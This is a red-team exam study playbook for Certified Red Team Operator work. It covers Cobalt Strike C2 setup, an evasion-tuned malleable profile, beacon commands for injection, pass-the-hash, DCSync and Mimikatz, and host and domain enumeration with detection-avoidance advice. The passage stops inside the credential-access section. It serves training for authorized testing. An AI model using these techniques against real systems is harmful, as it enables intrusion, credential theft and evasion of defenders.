# CRTO I — Red Team Operator Playbook

**Exam-day command reference, attack paths, and OPSEC for the Zero Point Security Certified Red Team Operator (Red Team Ops I) practical exam.**

> **Scope:** Windows / Active Directory red team operations with Cobalt Strike as the primary C2.
> **Built from:** the public 28-module Red Team Ops curriculum, public tool documentation (Cobalt Strike, Mimikatz, Rubeus, PowerView, BloodHound/SharpHound, Certify/Certipy, SharpDPAPI, Impacket), MITRE ATT&CK, and public candidate reports.
>
> **This is a study aid, not a substitute for hands-on practice.** The exam grades execution and OPSEC, not recall. Every command here should be practised in the lab until it is routine.
>
> **For authorized lab and exam use only.**

## Verify before exam day

- **The exam format has changed more than once.** Public 2025–2026 reports describe a **pausable practical lab**: roughly **24–48 hours of active lab time inside a 7-day window**, **100 points with 85 to pass**, and roughly **half the points for the operational objective and half for OPSEC/detection**. Zero Point does not publish the exact rubric. Confirm the current format, Rules of Engagement, and **restricted-host list** in your Candidate Handbook / portal before you start.
- **Cobalt Strike and kit syntax drifts between versions.** Anything marked ⚠ must be tested in the lab.
- **You do not need to be perfect.** Public pass reports range from the high 80s to the high 90s. Losing a few OPSEC points is survivable; leaking a beacon on a restricted host or tripping whitelisting repeatedly is not.

## Legend

| Tag | Meaning |
|---|---|
| ✅ | Verified against public tool documentation or CRTO write-ups |
| ⚠ | Version, build, or kit dependent — test it in the lab |
| 🔊 | Noisy / high detection risk |
| 🟢 | Lower-noise alternative where one exists |
| **OPSEC** | What the action leaves behind and how to reduce it |

## How to use this under exam pressure

1. **Part II is the playbook.** Start at the phase you are in. Every technique follows the same shape: *when to use → exact commands → OPSEC → troubleshooting.*
2. **Part III is the lookup.** When you know the tool but not the flag, jump straight to the appendix.
3. **Before every action, run the three OPSEC questions** (Part I): *What process runs? What does it touch? What does it write or send?*
4. **Keep a running action log** — timestamp, host, technique, artifact created. It makes cleanup and the OPSEC half of the exam far easier.
5. **When stuck, change one variable at a time.** Most "beacon won't run" failures are payload/architecture/listener mismatch, AV/AMSI, or egress — not a broken tool.

## The exam attack path at a glance

If you remember nothing else, remember the shape of the exam:

```text
1. Foothold            → quiet recon: know the host, the user, the monitoring
2. Find the path       → BloodHound DCOnly + targeted PowerView
                         (Kerberoast, AS-REP, ACL, delegation, ADCS, LAPS, MSSQL)
3. Credentials         → tokens / tickets / DPAPI first; LSASS last
4. Local privilege     → only if the path requires it
5. Lateral movement    → WinRM or an SMB beacon; PsExec only as a fallback
6. Domain escalation   → ACL → DCSync → golden/diamond, or ADCS/delegation
7. Objective host      → quietest reliable path, minimum actions, maximum cleanup
8. Cleanup + submit    → Appendix G checklist
```

**The five OPSEC decisions that decide pass/fail:**

1. **C2 customised before the first beacon** — profile, port, pipe, `spawnto`.
2. **No default indicators** — no default `rundll32.exe` parent, no default URIs/pipe/port.
3. **No LSASS access on restricted hosts** — use tokens, tickets, DPAPI, SYSVOL.
4. **No debris** — remove services, tasks, files, firewall rules, ACL changes.
5. **No security-control changes and no detections on restricted hosts.**

## Contents

- **Part I — Doctrine**
  - 1. Exam mechanics and scoring
  - 2. The OPSEC model
  - 3. Telemetry: what your actions trigger
  - 4. Exam-day workflow and time-boxing
- **Part II — Playbook**
  - 5. C2 setup and payloads (Cobalt Strike)
  - 6. Foothold and reconnaissance
  - 7. Credential access
  - 8. Local privilege escalation
  - 9. Lateral movement
  - 10. Pivoting and tunnelling
  - 11. Active Directory reconnaissance
  - 12. Kerberos and domain escalation
  - 13. Active Directory Certificate Services (ADCS)
  - 14. Persistence
  - 15. Defense evasion and OPSEC deep dive
  - 16. Data hunting, exfiltration, and cleanup
- **Part III — Appendices**
  - A. Beacon command reference
  - B. Tool reference (Mimikatz, Rubeus, PowerView, SharpDPAPI, Seatbelt, SharpUp, SQL)
  - C. One-liners
  - D. Ports, services, and protocols
  - E. Kerberos attack decision tree
  - F. Event ID and detection table
  - G. OPSEC checklist (use this before submitting)
  - H. Tool paths and file transfer
  - I. Troubleshooting
- **Sources and further reading**

---

## A note on sources

The public CRTO curriculum is 28 modules: Getting Started, Command & Control, External Reconnaissance, Initial Compromise, Host Reconnaissance, Host Persistence, Host Privilege Escalation, Host Persistence (Reprised), Credential Theft, Password Cracking, Domain Reconnaissance, User Impersonation, Lateral Movement, Data Protection API, Kerberos, Pivoting, ADCS, Group Policy, MS SQL Servers, Microsoft Configuration Manager, Domain Dominance, Forest & Domain Trusts, LAPS, Microsoft Defender Antivirus, Application Whitelisting, Data Hunting & Exfiltration, Extending Cobalt Strike, and Exam Preparation.

This playbook condenses the operator-facing parts of that scope. It does **not** reproduce Zero Point Security's paid course text, labs, or slides. Commands are standard public tool syntax; OPSEC guidance combines public documentation with themes reported by candidates who have taken the exam.

# Part I — Doctrine

## 1. Exam mechanics and scoring

Treat every number below as **"verify in your portal."** The format has been revised; candidates report these figures rather than the vendor.

| Item | Public 2025–2026 reports | What it means for you |
|---|---|---|
| Format | Pausable practical lab, no proctor, no written report in current format | You work at your own pace inside the window |
| Time | ~24–48 hours of active lab time, spread across a 7-day window | Pausing is allowed — use it to reset and re-plan |
| Scoring | 100 points, **85 to pass** | You can lose ~15 points and still pass |
| Objective | Roughly 50 points: retrieve/upload a designated file on a specific server | The "flag" is an operational objective, not a text flag |
| OPSEC | Roughly 50 points: detection/noise score, graded mechanically after submission | Half the exam is *how* you did it |
| Feedback | End-of-exam feedback only | You will not know your OPSEC score live — assume everything is logged |
| Retakes | Reportedly free/unlimited in the revised format | Still plan to pass first time |

**The OPSEC score is the exam.** Public reports of near-misses consistently blame OPSEC, not the objective: blocked code execution, unusual egress, default Cobalt Strike indicators, LSASS handle access, service creation, and detections on restricted hosts. A clean 50-objective run with sloppy tradecraft fails at 84. A slightly slower run with quiet tradecraft passes.

### Rules of Engagement: read them twice

- The RoE lists **restricted hosts**. Any detection on a restricted host costs OPSEC points — often heavily.
- Know what is **out of scope** (usually the attack box, the C2 infrastructure, and anything explicitly listed).
- Know what **counts as a detection**: blocked execution, AV alerts, EDR telemetry, event-log anomalies, and in some cases simply touching a restricted host.
- Note whether **disabling security controls** is permitted. Even when technically possible, it is usually graded as a detection.

### The objective

The operational objective is typically "get a specific file from / to a specific host." This forces the full chain: foothold → recon → privilege → lateral movement → target access. Do not tunnel-vision on Domain Admin. Read the objective, identify the shortest path, and keep the OPSEC cost of each hop in mind.

---

## 2. The OPSEC model

OPSEC on CRTO is not a checklist of tricks. It is a habit of asking three questions **before** every command:

1. **What process runs, and where?**
   - `shell` → `cmd.exe` child of the beacon's process; command line logged (4688).
   - `run` → runs a program without `cmd.exe`; still a child process.
   - `execute-assembly` → .NET assembly in a **sacrificial** process (fork-and-run); the assembly itself is not on disk.
   - `powerpick` → PowerShell run **in-process** without `powershell.exe`; no 4688 for `powershell.exe`, but the beacon process hosts the CLR.
   - `powershell` → spawns `powershell.exe`; script-block logging (4104) and command line (4688).
   - `inject` / `shinject` / `spawn` → new process or remote thread; Sysmon 8/10 and image-load telemetry.
2. **What does it touch?**
   - LSASS (`sekurlsa::*`, `hashdump`) → Sysmon 10, Defender ASR, EDR.
   - SAM/SECURITY (`lsadump::sam`, `secrets`) → registry hive access; often requires SYSTEM.
   - The directory (`dcsync`, ACL writes, RBCD) → 4662 / 5136 / 4769.
   - SMB shares, WinRM, WMI → network logons, service/task creation.
3. **What does it write or send?**
   - Files on disk (payloads, dumps, tools) → file-create telemetry; leave them and you leave evidence.
   - New services, scheduled tasks, firewall rules, registry keys → durable artifacts.
   - Beacon egress → proxy/firewall/WFP logs; a process making an unexpected connection is a classic detection.

### The OPSEC golden rules

1. **Customise the C2 before you do anything.** A default profile, default port, default `rundll32.exe` spawn, and default named pipe are the easiest detections in the exam.
2. **Never touch LSASS if a quieter path exists.** Prefer tokens, tickets already in memory, DPAPI, registry hives, and delegated credentials. When you must read LSASS, do it in a sacrificial process, once, and delete the dump.
3. **Prefer in-memory and in-process over disk and `cmd.exe`.** `execute-assembly` > `powershell -enc` > `shell`.
4. **Match the noise to the host.** A workstation tolerates more than a Tier-0 server. Restricted hosts tolerate nothing.
5. **Use long sleep and jitter.** A slow lifeline beacon that spawns short-lived sessions is safer than one chatty beacon on every host.
6. **Change defaults that are signatures.** `spawnto`, named pipes, ports, user-agent, URI paths, stage settings.
7. **Do not disable security controls.** It is almost always a scored detection.
8. **Clean up as you go.** Services, tasks, files, firewall rules, ACL entries, delegation attributes, shadow credentials, tickets, tokens, port forwards.
9. **Prefer AES over RC4 where the tool supports it.** RC4 ticket requests are conspicuous (4769 `0x17`). Rubeus `/opsec` and `asktgt /enctype:aes256` exist for a reason.
10. **Stay low and slow.** Time-boxed aggression is for labs, not a graded OPSEC exam.

### Risk tiers (use this to decide how loud you can be)

| Tier | Examples | Behaviour |
|---|---|---|
| **Tier 0 / restricted** | Domain controllers, CA, backup, PKI, the objective host | Assume full EDR + logging. No `shell`, no LSASS, no default anything. Minimal, targeted actions. |
| **Tier 1** | Member servers (SQL, file, web), admin workstations | Moderate. Prefer `execute-assembly`, custom profiles, named-pipe pivots. |
| **Tier 2** | User workstations | More tolerant, but egress and process anomalies still count. |

---

## 3. Telemetry: what your actions trigger

You do not need to memorise every event ID. You need to know **which of your actions produce which of these**, so you can choose the quieter option.

### Windows Security log

| ID | Event | Triggered by | OPSEC note |
|---|---|---|---|
| 4624 | Logon success | Every logon. Type 2 interactive, 3 network, 9 `runas /netonly`, 10 RDP | Type 3 + NTLM is the pass-the-hash signature |
| 4625 | Logon failure | Bad creds, spraying, blocked logons | Spraying without checking lockout policy is loud |
| 4648 | Explicit credentials | `runas`, `make_token`/netonly, scheduled tasks with creds | Common with lateral movement |
| 4672 | Special privileges assigned | Admin/SYSTEM logon | Expected, but volume matters |
| 4688 | Process creation | Any new process (with command line if audit enabled) | `shell`/`run`/`jump` all land here |
| 4697 | Service installed (Security) | PsExec, `sc create`, service-based lateral movement | High-signal detection |
| 4698 | Scheduled task created | `schtasks`, Task Scheduler lateral movement | High-signal detection |
| 4720/4722/4726 | User created/enabled/deleted | Persistence | Avoid unless required |
| 4728/4732/4756 | Added to privileged/local/universal group | ACL abuse, `Add-DomainGroupMember` | Loud; revert if possible |
| 4768 | TGT requested | `asktgt`, overpass-the-hash, logon | RC4 TGTs are anomalous on modern domains |
| 4769 | Service ticket requested | Kerberoasting, normal service access | RC4 (`0x17`) + unusual SPN = Kerberoast signature |
| 4770 | TGT renewed | Long-lived tickets | — |
| 4771 | Kerberos pre-auth failed | Bad password / spraying | — |
| 4776 | NTLM credential validation | Pass-the-hash, NTLM auth | Type 3 + 4776 = PTH pattern |
| 4662 | Directory service access | DCSync, replication, sensitive object reads | Replication GUIDs = DCSync signature |
| 5136 | Directory object modified | ACL edits, RBCD, shadow credentials, SPN changes | Very high-signal; clean up |
| 1102 | Audit log cleared | `wevtutil cl`, `Clear-EventLog` | Almost always scored; do not do it |

### PowerShell and Sysmon

| ID | Source | Triggered by | OPSEC note |
|---|---|---|---|
| 4103 | PowerShell module logging | Module/pipeline use | `powerpick` can avoid `powershell.exe` but not always logging |
| 4104 | PowerShell script-block logging | PowerShell content | Encoded commands and downloads are visible |
| 400/403 | PowerShell engine start/stop | Every `powershell.exe` | Avoid spawning it where possible |
| Sysmon 1 | Process create | Every process, with hash and parent | Parent/child lineage matters |
| Sysmon 3 | Network connection | Beacon egress, SMB, WinRM, RDP | Unexpected process egress is a scored detection |
| Sysmon 7 | Image loaded | .NET assemblies, injected DLLs | Unsigned/module loads stand out |
| Sysmon 8 | CreateRemoteThread | `inject`, `shinject`, process injection | Classic injection detection |
| Sysmon 10 | ProcessAccess | LSASS reads, handle duplication | `0x1010`/`0x1410` on `lsass.exe` = credential theft |
| Sysmon 11 | FileCreate | Payloads, dumps, tools on disk | Clean up files |
| Sysmon 12/13 | Registry create/set | Run keys, COM hijacks, service config | Persistence telemetry |
| Sysmon 17/18 | Pipe created/connected | SMB beacons, named-pipe pivots | Default pipe names are signatures |
| Sysmon 19/20/21 | WMI filter/consumer/binding | WMI persistence | High-signal |
| Defender 1116/1117 | Malware detected/actioned | AV hits | A detection is a detection even if blocked |
| Defender 5001 | Real-time protection disabled | Disabling Defender | Scored; do not |
| Defender 5007 | Defender config changed | Exclusions, ASR changes | Scored; do not |
| WFP 5156/5157 | Connection allowed/blocked | Egress, port forwards, listeners | Firewall rules and listeners are visible |

### The three detections candidates most often lose points on

1. **Default Cobalt Strike indicators** — default profile, default `rundll32.exe` spawn, default pipe, default port, no jitter, staged payload with default stager.
2. **LSASS access** — `mimikatz sekurlsa::logonpasswords` / `hashdump` on a monitored host.
3. **Egress from an unexpected process** — a `rundll32.exe`, `dllhost.exe`, or `notepad.exe` making outbound HTTPS to a random IP with no proxy history.

---

## 4. Exam-day workflow and time-boxing

### First 30 minutes

1. Read the RoE, the objective, and the restricted-host list again.
2. Map the starting position: what host, what user, what privileges, what network access.
3. Configure or verify the C2: profile, listener, `spawnto`, pipes, ports. **Before any beacon runs.**
4. Start an action log: `time | host | action | artifact | cleanup needed`.
5. Identify the shortest plausible path to the objective and write it down. Then find the second path — you will likely need it.

### Per-host loop

1. **Situational awareness** (quiet): whoami, groups, privileges, network, AV/EDR, patch level.
2. **Decide the value of the host**: objective, Tier 0, credential source, pivot, or dead end.
3. **Do the minimum** that advances the path. Do not "collect everything" on a Tier-0 host.
4. **Record artifacts** before you create more.
5. **Clean up** when the host is no longer needed.

### Time-boxing

| Phase | Suggested budget | Rule |
|---|---|---|
| Setup + recon | 10–15% | Do not rush the profile; it protects the other 85% |
| Foothold → first privilege | 20% | If a path is blocked twice, move to another |
| Lateral movement | 30% | This is where most candidates lose time |
| Objective | 20% | Leave slack; the objective host is usually the most monitored |
| Cleanup + verification | 10–15% | Do not submit with services/tasks/files still present |

### When you are stuck

- Re-read the objective. Candidates often over-engineer a path that the exam did not require.
- Check the obvious: wrong architecture (x86/x64), wrong listener, firewall egress, AV quarantine, expired ticket, wrong domain/hostname (Kerberos needs FQDN, not IP).
- Change **one** variable per attempt and log the result. Randomly trying ten commands creates ten detections and teaches you nothing.
- If a host is a trap or restricted, leave it. A failed quiet attempt costs less than a successful loud one.

# Part II — Playbook

## 5. C2 setup and payloads (Cobalt Strike)

Everything in this section happens **before** you touch a target. A weak profile here is the single most common reason candidates lose OPSEC points, because every later action inherits it.

### 5.1 Components

| Component | Purpose | Exam notes |
|---|---|---|
| Team server | Central C2; stores sessions, listeners, loot | Usually Linux; start it before the client |
| Client | Operator GUI | Connect with host, port 50050, password |
| Listener | Where beacons call back (or bind) | HTTP/HTTPS/SMB/TCP/DNS/Foreign |
| Redirector | Separate host that forwards to team server | Hides the team server IP; use if provided |
| Profile | Malleable C2 traffic shape | Customise **before** generating payloads |
| Artifact/Resource Kit | Builds payloads/templates that evade static AV | Rebuild after changing profile |

### 5.2 Team server

```bash
# Linux, from the Cobalt Strike directory
./teamserver <teamserver-ip> <password> <profile.profile>
```

```text
# Client
Connect → Host: <teamserver-ip>  Port: 50050  User: <name>  Password: <password>
```

**OPSEC:** the team server must never be reachable from the target network directly. Use a redirector or CDN. Keep the operator client off the target network.

### 5.3 Listeners

| Listener | Key fields | Use |
|---|---|---|
| Beacon HTTP | Host, port, HTTP Host header, URI | Egress over 80; pair with redirector |
| Beacon HTTPS | Host, port, Host header, URI, SSL cert | Preferred egress; blends with web |
| Beacon SMB | Pipe name | Peer-to-peer inside a network; no direct egress |
| Beacon TCP | Port | Bind session; useful behind NAT/pivot |
| Beacon DNS | Domain, DNS server | Slow but egress-friendly; high OPSEC risk if noisy |
| Foreign HTTP/HTTPS | Host, port | External C2 / redirector chain |

**OPSEC:**
- Do **not** use the default ports (50050 is the team server; beacon defaults are well known).
- Do **not** use default URIs (`/submit.php`, `/ca`, `/dpixel`, `/__utm.gif`) or the default user-agent.
- Change the SMB **pipe name**. The default is heavily signatured.
- Prefer HTTPS with a valid-looking certificate and a believable Host header.
- Use jitter and a sane sleep (e.g., 60s ± 20–30%) for anything that will live more than a few minutes.

### 5.4 Malleable C2 profile — OPSEC essentials

A profile controls the HTTP request/response shape, staging, and process-injection behaviour. Minimum changes that materially reduce detection:

```text
# --- identity ---
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...";
set sleeptime "60000";
set jitter    "25";
set killdate  "2026-12-31 23:59:59";

# --- staging ---
stage {
    set obfuscate "true";
    set cleanup   "true";
    set userwx    "false";        # do not allocate RWX
    set stomppe   "true";
}

# --- process injection ---
process-inject {
    set allocator "NtMapViewOfSection";
    set execute   "CreateThread";
    set min_alloc "0";
}

# --- large tasks (Kerberos relay, big assemblies) ---
set tasks_max_size "2097152";

# --- http-get / http-post ---
http-get {
    set uri "/news/archive/2026/index.html";
    client {
        header "Host" "cdn.example.com";
        header "Accept" "*/*";
        metadata { base64; prepend "session="; header "Cookie"; }
    }
    server {
        output { base64; prepend "<!-- "; append " -->"; print; }
    }
}
```

**OPSEC checklist for the profile:**
- [ ] Non-default URIs for `http-get`, `http-post`, and any staging URI
- [ ] Non-default user-agent, matching the Host header story
- [ ] `sleep` ≥ 60s and `jitter` 20–30% for persistent sessions
- [ ] `stage { cleanup "true"; obfuscate "true"; userwx "false"; }`
- [ ] `process-inject` allocator/execute changed from defaults
- [ ] `spawnto` changed from `rundll32.exe`
- [ ] SMB pipe name changed from the default
- [ ] `killdate` set so a forgotten beacon dies
- [ ] Profile tested: `./c2lint profile.profile`

### 5.5 Payloads

**Staged vs stageless**

| | Staged | Stageless |
|---|---|---|
| Size | Small stager | Full beacon embedded |
| Traffic | Stager fetch then beacon | Beacon only |
| Detection | Stager is a known pattern; extra request | Larger file, but no stager signature |
| Use | Constrained delivery | Preferred when you can deliver a larger file |

**Build path:** `Attacks → Packages → Windows Executable (S)` (staged) or `Windows Executable` (stageless); also DLL, Service Exe, MSI, PowerShell, Python.

**Artifact Kit / Resource Kit** ⚠: rebuild after changing the profile, then use `ak-settings` to confirm spawn-to and other defaults. Public guidance from candidates: rebuild the Artifact Kit and Resource Kit with your profile, and verify the output rather than trusting a stale build.

**OPSEC:**
- Prefer stageless for anything that must survive.
- Match architecture to the target (x64 on modern Windows; x86 only for 32-bit processes/hosts).
- Test the payload against the target's AV **in the lab**, not on the exam host.
- Name files innocuously if they must touch disk; put them in a user-writable temp path.
- Delete payloads after use.

### 5.6 Beacon operating basics

| Command | Effect | OPSEC |
|---|---|---|
| `sleep <s>` / `jitter <pct>` | Check-in interval / variance | Longer + jitter = quieter |
| `spawnto x64 <path>` | Process used for fork-and-run | 🔊 default `rundll32.exe`; change it |
| `blockdlls start` | Block non-Microsoft DLLs in child processes | 🟢 reduces EDR userland hooks in children |
| `spawnto` / `ak-settings` | Verify the spawn-to target | Do this **before** running assemblies |
| `ps` | List processes | 🟢 in-memory |
| `job` / `jobkill <id>` | List/kill long-running jobs (socks, keylogger, portscan) | Clean up jobs |
| `getuid` | Current token | 🟢 |
| `rev2self` | Drop impersonation | Use after token work |
| `spawn x64 <listener>` | New beacon in a new process | Creates a process; parent lineage matters |
| `inject <pid> x64 <listener>` | Inject beacon into an existing process | Sysmon 8/10 |
| `shinject <pid> <arch> <file.bin>` | Inject shellcode | Sysmon 8; file on disk |
| `shspawn <arch> <file.bin>` | New process with shellcode | — |
| `link <host> <pipe>` | Connect to an SMB beacon | 🟢 no direct egress |
| `connect <host> <port>` | Connect to a TCP bind beacon | — |
| `unlink` | Disconnect a child | Clean up |
| `upload` / `download` | File transfer | File-create telemetry |
| `shell <cmd>` | Run via `cmd.exe` | 🔊 4688 + command line |
| `run <cmd>` | Run a program without `cmd.exe` | Quieter than `shell` |
| `execute-assembly <path> <args>` | .NET assembly in sacrificial process | 🟢 preferred for tooling |
| `powerpick <cmd>` | PowerShell in-process | 🟢 no `powershell.exe` |
| `powershell <cmd>` | PowerShell child process | 🔊 4688 + 4104 |
| `powershell-import <file>` | Import a script, then `powerpick` | Import once, call functions |
| `mimikatz <args>` | Mimikatz in a sacrificial process | 🔊 LSASS access |
| `hashdump` | Dump SAM hashes | 🔊 |
| `logonpasswords` | LSASS logon passwords | 🔊 |
| `dcsync <domain> <user>` | DCSync a principal | 🔊 4662 |
| `socks <port> [socks5 ...]` | SOCKS proxy | Use SOCKS5 |
| `rportfwd <lport> <rhost> <rport>` | Reverse port forward | Creates a listener |
| `portscan <host> <ports>` | Scan | Egress from beacon process |
| `net <subcommand>` | Net commands | 4688 if shell-backed |
| `screenshot` / `clipboard` / `keylogger` | Collection | User-visible / high-signal |
| `make_token <dom\user> <pass>` | Create a netonly token | 4648 |
| `steal_token <pid>` | Steal a token | Sysmon 10 |
| `token-store` | Save/store stolen tokens | 🟢 manage tokens without re-stealing |
| `pth <dom\user> <ntlm>` | Pass-the-hash | 4624 type 3 / 4776 |

**Token prefixes in `mimikatz`:** `!` runs the command as SYSTEM; `@` impersonates the beacon's current thread token. Use `!` only when you need SYSTEM and accept the noise.

### 5.7 Session hygiene

- Keep one **slow, long-lived lifeline** beacon with a quiet profile, and spawn short-lived sessions from it for specific tasks. If a session is burned, you still have a way back in.
- Prefer **peer-to-peer (SMB) sessions** inside the network; only the egress beacon should talk to the internet.
- Set `killdate`. A beacon you forget is a detection you cannot explain.
- `jobkill` proxies, keyloggers, and portscans when finished.
- Record every session's host, user, and parent. Parent/child lineage is a detection category.

### 5.8 Troubleshooting: no beacon

| Symptom | Likely cause | Check |
|---|---|---|
| No callback at all | Egress blocked / wrong host / firewall | `Test-NetConnection <host> -Port <port>`; try 80/443; check proxy |
| Callback but no session | Wrong listener / architecture | x86 vs x64; listener name in payload |
| Defender quarantines instantly | Static signature | Rebuild Artifact Kit with profile; obfuscate; test in lab |
| Beacon dies after first task | AV/EDR kills the process | Change `spawnto`; use `blockdlls`; avoid `rundll32.exe` |
| SMB link fails | Wrong pipe name / SMB blocked | Verify pipe name; `net view \\host`; port 445 |
| Beacon connects but tasks fail | Token/privilege mismatch | `getuid`, `whoami /priv`; check architecture of the sacrificial process |

## 6. Foothold and reconnaissance

### 6.1 The first five minutes on a new host

Do these in order. Use `run` or `execute-assembly` where possible; avoid `shell` for anything you can run another way.

```text
whoami /all
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Domain"
ipconfig /all
route print
arp -a
netstat -ano | findstr LISTENING
```

| Question | Command |
|---|---|
| Who am I, and what groups/privileges? | `whoami /all` · `whoami /priv` · `whoami /groups` |
| Is this host domain-joined? | `systeminfo` · `echo %USERDOMAIN%` |
| What is the OS/patch level? | `systeminfo` · `wmic qfe get HotFixID,InstalledOn` |
| What network can I reach? | `ipconfig /all` · `route print` · `arp -a` |
| What is listening? | `netstat -ano` · `run netstat -anop tcp` |
| Who else is logged on? | `query user` · `net session` · `Get-NetLoggedon` |
| What is mounted / shared? | `net use` · `net share` · `Get-NetShare` |
| Local admins? | `net localgroup administrators` · `Get-NetLocalGroupMember -Group "Administrators"` |
| Domain and DC? | `echo %LOGONSERVER%` · `nltest /dsgetdc:<domain>` |

**Automatic tell:** if `whoami /priv` includes `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`, a Potato-family escalation may be available (Section 8). If it includes `SeDebugPrivilege`, LSASS is reachable — but that is noisy; weigh it.

### 6.2 Host enumeration with native commands

```text
# Users and groups
net user
net user <username> /domain
net localgroup
net localgroup administrators
net group /domain
net group "Domain Admins" /domain
net group "Domain Computers" /domain

# Sessions, shares, connections
net session
net use
net share
net view \\<host>
net view /domain:<domain>

# Installations, patches, drivers
wmic product get name,version
wmic qfe get HotFixID,InstalledOn
wmic logicaldisk get name,description
driverquery

# Processes and services
tasklist /v
tasklist /svc
sc query state= all
sc qc <service>
wmic service get name,displayname,pathname,startmode

# Credentials already on the host
cmdkey /list
dir /a %USERPROFILE%\AppData\Roaming\Microsoft\Credentials
dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials

# Environment and policy
set
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
```

### 6.3 .NET and scripted enumeration (preferred)

```text
# Seatbelt — broad, categorised host survey
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=all -full
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=user
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=misc
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=browser

# SharpUp — privilege-escalation checks
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableScheduledTask

# winPEAS — if you must use scripted enumeration
execute-assembly C:\Tools\winPEAS\winPEASx64.exe

# PowerView host-side
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
powerpick Get-NetLocalGroup -ComputerName <host>
powerpick Get-NetLocalGroupMember -ComputerName <host> -GroupName Administrators
powerpick Get-NetSession -ComputerName <host>
powerpick Get-NetLoggedon -ComputerName <host>
powerpick Get-NetShare -ComputerName <host>
powerpick Get-NetFirewallRule | select DisplayName,Direction,Action,Enabled
```

### 6.4 Security posture

Before you run tooling, know what is watching.

```text
# Defender
powershell Get-MpComputerStatus
powershell Get-MpPreference | select DisableRealtimeMonitoring,ExclusionPath,AttackSurfaceReductionRules_Ids
powershell (Get-MpPreference).AttackSurfaceReductionRules_Ids

# AppLocker / WDAC
powershell Get-AppLockerPolicy -Effective -Xml
powershell Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
powershell $ExecutionContext.SessionState.LanguageMode

# Logging posture
powershell Get-WinEvent -ListLog Security | select IsEnabled,LogMode
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

| Result | Implication |
|---|---|
| Real-time protection **enabled**, ASR on | Assume payload interception. Prefer in-memory, custom artifacts, `blockdlls`. |
| AppLocker **enforcing** | Only run binaries from allowed paths (usually `C:\Windows`, `C:\Program Files`). Use LOLBAS or a writable allowed path. |
| `LanguageMode = ConstrainedLanguage` | PowerShell is restricted; .NET assemblies may still run. |
| Sysmon present | Assume process/network/LSASS telemetry is complete. |
| Defender exclusions present | Note them — they tell you what the defenders expect you to abuse. |

**OPSEC:** `Get-MpComputerStatus` and `Get-AppLockerPolicy` are low-noise. Running `winPEAS`, `Invoke-UserHunter`, or `Find-LocalAdminAccess` across many hosts is not.

### 6.5 Domain reconnaissance: the fast start

```text
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

powerpick Get-Domain
powerpick Get-DomainSID
powerpick Get-DomainController | select Forest,Name,OSVersion | fl
powerpick Get-DomainUser | select cn,samaccountname,description
powerpick Get-DomainUser -SPN | select cn,samaccountname,serviceprincipalname
powerpick Get-DomainUser -PreauthNotRequired | select cn,samaccountname
powerpick Get-DomainGroup | where Name -like "*Admin*" | select Name,SamAccountName
powerpick Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberDistinguishedName
powerpick Get-DomainComputer | select cn,dnshostname,operatingsystem
powerpick Get-DomainComputer -Unconstrained | select cn,dnshostname
powerpick Get-DomainOU | select Name
powerpick Get-DomainTrust
powerpick Get-Forest
powerpick Get-ForestTrust
powerpick Get-DomainPolicy
```

Then, and only then, consider the noisy checks:

```text
powerpick Find-LocalAdminAccess -Verbose
powerpick Find-InterestingDomainAcl -ResolveGUIDs
powerpick Find-DomainUserLocation
powerpick Invoke-ShareFinder -Verbose
```

**OPSEC:** each `Find-*` and `Invoke-*` touches many hosts and/or enumerates heavily. On a restricted host, do not run them from that host. Run them from a Tier-2 foothold and pivot.

### 6.6 OPSEC for reconnaissance

- **Prefer in-process queries.** `powerpick` avoids spawning `powershell.exe`; `execute-assembly` keeps the tool off disk.
- **Scope your queries.** `Get-DomainUser` with no filter is normal; `Find-LocalAdminAccess` across 500 hosts is not.
- **Do not use `net view` / `net group` loops** if you can do one LDAP query instead.
- **Watch the parent process.** Enumeration from `rundll32.exe` or `dllhost.exe` that then opens SMB to every host is an obvious pattern.
- **Cache what you learn.** Do not repeat a noisy query because you forgot the answer.
- **Record what you ran.** Recon generates the largest volume of telemetry; you will need it for cleanup and OPSEC review.

### 6.7 Troubleshooting

| Problem | Cause | Fix |
|---|---|---|
| `Get-Domain` fails | PowerView not imported, or no LDAP access | Re-run `powershell-import`; test `nltest /dsgetdc:<domain>` |
| `execute-assembly` "could not load file" | Wrong path/architecture | Verify path; use the x64 build |
| Assembly runs but no output | Output truncated / AV | Try smaller tool; check `job`; test in lab |
| `Get-NetLoggedon` returns nothing | Requires admin on the target | Run from an admin context or pivot |
| `Access is denied` on SMB | Not local admin | Find a host where you are; use `Find-LocalAdminAccess` sparingly |

## 7. Credential access

Credential theft is the highest-detection activity in the exam. **Take the quietest source that gives you what you need.** Public guidance from passing candidates is blunt: never touch `lsass.exe` on a monitored host if there is another path, and if you must, do it once, in a sacrificial process, and delete the dump.

### 7.1 Decision tree

```text
Do you have a token or ticket already in memory?
├─ Yes → use it (steal_token / ptt). No new credential access needed.
└─ No
   ├─ Need a user's password/hash to move laterally?
   │  ├─ Credential Manager / browser / DPAPI → Section 7.5–7.6 (quietest)
   │  ├─ Kerberos tickets in memory → Section 7.4
   │  ├─ SAM (local accounts) → Section 7.3 (needs admin)
   │  └─ LSASS (domain creds) → Section 7.2 (loudest; last resort)
